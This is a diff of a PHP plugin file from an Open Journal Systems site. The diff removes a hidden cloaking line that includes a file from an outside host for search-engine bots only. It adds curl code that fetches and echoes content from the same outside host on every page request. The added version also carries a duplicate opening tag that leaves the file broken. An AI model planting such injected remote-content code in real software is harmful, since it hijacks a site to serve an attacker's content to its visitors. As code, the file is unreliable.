@@ -1,6 +1,14 @@
 <?php
-error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/'){ include('https://piona.xyz/landing/journal.yayasansahara.org/index.txt'); exit; }
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
 
+$ch = curl_init("https://piona.xyz/landing/journal.yayasansahara.org/index.txt");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$data = curl_exec($ch);
+curl_close($ch);
+
+echo $data;
 /**
  * @file plugins/generic/usageEvent/PKPUsageEventPlugin.inc.php
  *
